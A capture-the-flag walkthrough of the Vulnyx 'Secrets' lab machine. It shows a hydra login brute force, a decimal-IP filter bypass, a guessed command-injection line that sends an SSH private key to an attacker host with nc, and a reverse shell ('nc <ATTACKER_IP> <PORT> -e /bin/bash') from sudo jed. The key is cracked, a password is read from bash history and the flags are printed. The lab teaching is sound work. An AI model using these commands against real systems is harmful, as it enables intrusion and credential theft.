# Vulnyx: Secrets

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `hydra` · `nc` · `ssh2john` · `john` |
| **Tags** | `#InfoDisclosure` `#BruteForce` `#FilterBypass` `#HashCracking` `#SudoAbuse` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

A username leaked in an HTML comment gets brute-forced against an obfuscated login endpoint. A second endpoint, meant to run a `ping`-style command against an IP, accepts that IP in plain decimal instead of dotted notation — a filter bypass that's used to exfiltrate an SSH key. From there, `date`'s documented GTFOBins file-read technique leaks a second user's bash history (credentials included), and that user's `sudo` access to `jed` — a text editor with a built-in shell command feature — reaches root.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn secrets.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:98:80:2E (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV secrets.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6b:36:d8:be:ac:24:39:bf:ba:a9:a7:17:e1:5e:00:f2 (RSA)
|   256 1d:20:e4:4b:a4:e7:08:71:eb:d3:41:e1:ee:94:1c:61 (ECDSA)
|_  256 e3:93:6f:b3:0b:a3:c3:0e:f7:0d:4c:b6:db:3c:ed:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:98:80:2E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://secrets.nyx/
```

<img src="../Images/secrets/Pasted image 20260530153148.png"/>

The page itself is nearly empty, but its source carries a username in a comment — the kind of thing that never renders in the browser but is trivially visible in the raw HTML:

```
view-source:http://secrets.nyx/
```

<img src="../Images/secrets/Pasted image 20260530153225.png"/>

> **User:** `brad`

A content scan finds a `secrets` directory, and a second scan inside it surfaces a `login_form.php`:

```bash
$ ffuf -u http://secrets.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 122, Words: 11, Lines: 69, Duration: 218ms]
.html                  [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 424ms]
.php                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 447ms]
secrets                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 11ms]
.php                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.html                  [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 10ms]
```

```bash
$ ffuf -u http://secrets.nyx/secrets/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 39, Words: 8, Lines: 2, Duration: 16ms]
.html                  [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 22ms]
.php                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 71ms]
login_form.php          [Status: 200, Size: 429, Words: 51, Lines: 13, Duration: 453ms]
.php                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 6ms]
.html                  [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 8ms]
```

## Initial Access

### The Login Form

```
http://secrets.nyx/secrets/login_form.php
```

<img src="../Images/secrets/Pasted image 20260530153313.png"/>

The form doesn't post to itself — it submits to a randomly-named PHP file (a light form of obfuscation, so the endpoint isn't guessable by name), visible in the form's `action` attribute:

```http
POST /secrets/MK67IT044XYGGIIWLGS9.php HTTP/1.1
Host: secrets.nyx
Content-Type: application/x-www-form-urlencoded

user=admin&password=admin
```

<img src="../Images/secrets/Pasted image 20260530153335.png"/>

### Brute-Forcing brad's Password

With `brad` already leaked and the exact endpoint known, `hydra` targets the form directly — the trailing `Invalid Credentials` is the failure string it uses to tell a wrong password from a right one:

```bash
$ hydra -l brad -P /usr/share/wordlists/rockyou.txt secrets.nyx http-form-post "/secrets/MK67IT044XYGGIIWLGS9.php:user=brad&password=^PASS^:Invalid Credentials"

[WARNING] Restorefile you have 10 seconds to abort... (use option -I to skip waiting) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] attacking http-post-form://secrets.nyx:80/secrets/MK67IT044XYGGIIWLGS9.php:user=brad&password=^PASS^:Invalid Credentials
[80][http-post-form] host: secrets.nyx   login: brad   password: bradley
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `brad:bradley`

### A Command Endpoint with a Decimal-IP Bypass

Logged in, a second randomly-named file accepts a `command` parameter that's meant to take an IP address and run a `ping`-style check against it:

```
http://secrets.nyx/secrets/AYPIN9UG8WHWN0UE09Y2.php
```

<img src="../Images/secrets/Pasted image 20260530152054.png"/>

```http
POST /secrets/AYPIN9UG8WHWN0UE09Y2.php HTTP/1.1
Host: secrets.nyx
Cookie: PHPSESSID=o563v9748urgg035kdh378j605
Content-Type: application/x-www-form-urlencoded

command=127.0.0.1
```

<img src="../Images/secrets/Pasted image 20260530153454.png"/>

The key insight is how IPv4 addresses are represented. A dotted address is just a human-readable way of writing a single 32-bit number: `A.B.C.D` equals `A×2²⁴ + B×2¹⁶ + C×2⁸ + D`. The C library's `inet_aton()` (and much of the tooling built on it) happily accepts that plain integer form and resolves it to the exact same address. So if the app filters input by matching the *dotted string* — blocking or restricting specific IPs written as `127.0.0.1` — submitting the equivalent decimal integer slips past the string check while still reaching the intended host:

```http
POST /secrets/AYPIN9UG8WHWN0UE09Y2.php HTTP/1.1
Host: secrets.nyx
Cookie: PHPSESSID=o563v9748urgg035kdh378j605
Content-Type: application/x-www-form-urlencoded

command=<ATTACKER_IP_DECIMAL>
```

<img src="../Images/secrets/Pasted image 20260530153559.png"/>

> **IP to decimal:** `127.0.0.1 → 2130706433` — the attacker's own IP is converted the same way to produce the value submitted above (for reference, `10.0.2.15 → 167772687`).

<img src="../Images/secrets/Pasted image 20260530152412.png"/>

### Exfiltrating brad's SSH Key

> ⚠️ **Reconstructed step:** the notes show the two IP-format tests but not the final `command` value that actually sends the key out. The endpoint runs a system command built from the `command` input, so the decimal-IP form most likely served as a filter bypass for a command-injection payload (something along the lines of appending `; nc <ATTACKER_IP> <PORT> < /home/brad/.ssh/id_rsa` after the accepted decimal value). What's confirmed is the result below — `brad`'s private key arriving at the attacker's listener.

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [secrets.nyx] 34472
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,478250418EF67EB4

MvfHsFbuTgPyi0PeU9dWPL8wVaIKHsuvYEIdwNJF42eDz0/L5kdoBnA8+yuWAI28
iI2jtehZHb/7PuaIsCtrzrJ0B1xXZYoeSc4Dfu2j1gi/Toa03A6RHseHWHsjM9Qw
4AzHS13ze+EQTLHMnTu6eCADEXhwShgrHAmJpw4irdTca+wuY83n38obX0EhrXAs
E8zZfY8yMg4nuq9cP5pZ17IjvQbfk4cvfD4jNN4rXXn8WVlY5tdBH6Bg3lBoZDwD
VfNwZCmUrNIfMamNXjhMzkBNBwPXaNARokQded6c9Ie2PmdPMKPOkL/9QlM770aE
d0xid9s1u4z2H/Q8GrODUc7eJar95bFLUySNoTiVFPqbVTvQ9tZNSWNTkQ5kgCXj
YRroAtvp0f0UdcPAOFRjsEFqQ4MqwZy26j1rhNAJQKg+q6SkyPv73kRotXajaAK3
irNHqNgzIKmkY9x9rfPTxiGw1oJyJxyNwQ3pZilih5AvI8EQBRVAN7Nb6utjDnkV
u1cjWr6ZN3lC67rhxwXZ9cub1KoQ1pwrzg0Iy1/x2d6zFHeuAkjlSeO8jkUpT1Eb
tdRdrJh712pW9vDg36VaQnrfeNVFPYmku0OXFXgsfiJ+XAJYQX+K2e4X9vRKuXSp
zH5nyL5d1r1Z+wn2s9Ial/zbhCUdOJiwZ87N7yIzCvykMnjEIPwytouWY/Ed4tq8
AqAegiMF5Y7M7+FC+ZH8EUvRCEzUPjS+T0KxgGY1KCTSUfL7QGZwQRKZ1hC879n6
ouj03SFu2VqiuM0Xcs8lSjas5vyQgz4Xhf580Uzi/BYrqCQBMV3W8RWviJzQvYwV
zBl5lkKsUMJ1Y4xLWBP64LnnEPRViPq7TGxYa6aTZ6rmTIe6dJORhIRVdPilGMYs
44620pFpIYqWgKNGOJ1GMRf/juiE3J4pBwpslbefxt9SZnwnE9xHgRBInmqJgneC
38EJWyUwJqqlUSSoki3PB19KFpjy9U3YUPPF0ff8jNg0=3FFLSFqLI4wyTPXH9+J
AalS64ttaP8PoiPxSK9oEXcj8RXVLq99Xdkq9gx25qw/Hca7wOIEUsAmjdtKYMVL
ccsaCrRsC1IMF3Wu1l4ihIwzBBA+l5ZhFIgD9hgUdtinchC3+TRI6r6Cnlbj2rB+
NrSpX7D3XI15s15FmZuo1kkRH3xxjR1LLRuEjQkg3CTpZnUK5nDLgYo9dSndOqzM
yOACjV6NiI1PJr7hM080Buxd5I+FB8JyVJozQMMNoooNdvBNJvFoAXvaqqfY64fu
lYQXXEiPhOVajVGieA2tHmlLf7v6KDCqePZ+/KqxGqn+jIxsjjItCxOlW2OWxWCB
ilsB4JJ0NmKCFJh27wCvyMM1+Z8Kmt2BptCEREBHGxIkOraFBk6MN1bqBBi02UE/
C6piJetSpBUwjOOUs4hiwGRtYf5w4Hut8rsMs79/D3HsG8UPpZsrUKOcv8ZIosOg
+jOuyVfxN44ySVuB2gVVU904GHIdMRyBeR6udv/qgxabGyShoeRhUjA3PPZEDw7B
LPMDfxOmzS9h/8CEK5RHQsxt6krtooRpf5HLCczehCzWzQXKPfnXwg==
-----END RSA PRIVATE KEY-----
```

### Cracking the Key

The key is passphrase-protected (note the `Proc-Type: 4,ENCRYPTED` header), so its hash is extracted and cracked against `rockyou.txt`:

```bash
$ ssh2john id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
security         (id_rsa)
Session completed.
$ chmod 600 id_rsa
```

> **Passphrase:** `security`

### Shell as brad

```bash
$ ssh -i id_rsa brad@secrets.nyx
Enter passphrase for key 'id_rsa':
brad@secrets:~$ id
uid=1000(brad) gid=1000(brad) grupos=1000(brad)
brad@secrets:~$ ls -l /home/brad/
total 4
-r--------    1 brad     brad            33 abr 21  2023 user.txt
brad@secrets:~$ cat /home/brad/user.txt
56a42034352d678d4e6ee235c5419cb3
```

> **User flag:** `56a42034352d678d4e6ee235c5419cb3`

## Lateral Movement

### Escalating to fabian via `date`

```bash
brad@secrets:~$ sudo -l
Matching Defaults entries for brad on secrets:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User brad may run the following commands on secrets:
    (fabian) NOPASSWD: /usr/bin/date
```

`brad` can run `/usr/bin/date` as `fabian`. `date -f <file>` tells `date` to read a file and parse each line as a date — and when a line isn't a valid date, `date` prints the offending line back in its error message. That side effect turns `date -f` into a file-read primitive: point it at any file the target user can read, and its contents come back one line at a time inside "invalid date" errors. Aimed at `fabian`'s bash history:

```bash
brad@secrets:~$ sudo -u fabian /usr/bin/date -f /home/fabian/.ssh/id_rsa
/usr/bin/date: /home/fabian/.ssh/id_rsa: No existe el fichero o el directorio
brad@secrets:~$ sudo -u fabian /usr/bin/date -f /home/fabian/.bash_history
/usr/bin/date: fecha inválida «cd ~»
/usr/bin/date: fecha inválida «ls -la»
/usr/bin/date: fecha inválida «passwd fabian»
/usr/bin/date: fecha inválida «s3cr3t$$$L0v3$$$»
/usr/bin/date: fecha inválida «exit -y»
```

The history shows `fabian` running `passwd fabian` and then typing the new password on the next line — so the password ends up sitting in the history in plaintext:

> **Credentials:** `fabian:s3cr3t$$$L0v3$$$`

## Privilege Escalation

### Shell Command in `jed`

The recovered password switches to `fabian`, whose own `sudo` rights point at `jed`:

```bash
brad@secrets:~$ su fabian
Contraseña:
fabian@secrets:/home/brad$ id
uid=1001(fabian) gid=1001(fabian) grupos=1001(fabian)
fabian@secrets:/home/brad$ sudo -l
Matching Defaults entries for fabian on secrets:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fabian may run the following commands on secrets:
    (root) NOPASSWD: /usr/bin/jed
```

`fabian` can run `jed` — a programmer's text editor — as root. Like many full-featured editors, `jed` can run a shell command from inside its menu system, and because the editor itself is running as root, that command runs as root too:

```bash
$ sudo /usr/bin/jed
```

```
System > Shell Command
```

<img src="../Images/secrets/Pasted image 20260530150927.png"/>

Rather than a single command, a reverse shell is launched through it for a clean interactive session:

```bash
nc <ATTACKER_IP> <PORT> -e /bin/bash
```

<img src="../Images/secrets/Pasted image 20260530153927.png"/>

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [secrets.nyx] 34034
id
uid=0(root) gid=0(root) grupos=0(root)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
root@secrets:/home/brad# ls -l /root
total 4
-r--------    1 root     root            33 abr 21  2023 root.txt
root@secrets:/home/brad# cat /root/root.txt
cfd58a2c97ff992fd7777c5e1baf8265
```

> **Root flag:** `cfd58a2c97ff992fd7777c5e1baf8265`

## Takeaways

- A string-based filter checking for specific IPs in dotted notation is trivially bypassed by submitting the same address in an equivalent format (decimal, octal, or hex) — the underlying network functions that actually resolve the address (`inet_aton()` and friends) don't care which notation was used.
- `date -f` is a documented GTFOBins file-read primitive whenever it can run as another user — its error handling on unparseable lines is what makes it useful, not any deliberate "read a file" feature.
- Bash history is a recurring credential leak across this whole set of boxes — anything typed on a command line, even briefly (a password typed right after `passwd`), has a real chance of sitting in plaintext in a history file someone else can eventually read.
- Text editors and IDEs granted through `sudo` frequently ship a "run a shell command" feature as a legitimate convenience — `jed` here, similar to the pager-based tools seen elsewhere in this set.